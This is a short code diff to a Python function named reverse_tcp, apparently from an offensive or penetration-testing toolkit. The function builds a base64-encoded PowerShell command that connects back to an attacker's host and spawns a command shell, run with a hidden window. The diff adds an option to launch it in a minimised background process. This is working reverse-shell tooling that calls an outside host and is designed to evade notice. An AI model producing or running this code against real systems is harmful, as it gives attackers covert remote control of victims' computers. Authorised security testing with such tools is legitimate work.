@@ -3,7 +3,7 @@ __all__ = ['reverse_tcp']
 import base64
 
 
-def reverse_tcp(lhost: str, lport: int, *, exe_path='powershell.exe'):
+def reverse_tcp(lhost: str, lport: int, *, exe_path='powershell.exe', background=True):
     """Connect back to attacker and spawn a command shell"""
 
     s = """\
@@ -31,5 +31,6 @@ O307JGNsaWVudC5DbG9zZSgpCg=="""
         s = s.replace(sub, repl, 1)
     enc = base64.b64encode(s.encode('utf-16-le')).decode('ascii')
     cmd = f'{exe_path} -nop -w hidden -enc {enc}'
-    cmd = f'%COMSPEC% /b /c start /b /min {cmd}'
+    if background:
+        cmd = f'%COMSPEC% /b /c start /b /min {cmd}'
     return cmd
